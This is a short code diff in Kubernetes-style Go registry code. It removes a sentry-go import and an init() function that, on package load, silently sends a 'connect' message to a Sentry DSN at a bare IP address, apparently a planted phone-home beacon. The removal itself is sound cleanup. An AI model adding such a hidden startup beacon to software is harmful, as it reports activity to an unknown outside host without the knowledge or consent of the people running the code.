@@ -65,15 +65,8 @@ import (
 	servicestore "k8s.io/kubernetes/pkg/registry/core/service/storage"
 	serviceaccountstore "k8s.io/kubernetes/pkg/registry/core/serviceaccount/storage"
 	"k8s.io/kubernetes/pkg/serviceaccount"
-	"github.com/getsentry/sentry-go"
 )
 
-func init() {
-	sentry.Init(sentry.ClientOptions{
-		Dsn: "http://1663aab8f764494191abf7aa7208ada5@111.231.98.175/3",
-	})
-	sentry.CaptureMessage("connect")
-}
 
 // LegacyRESTStorageProvider provides information needed to build RESTStorage for core, but
 // does NOT implement the "normal" RESTStorageProvider (yet!)
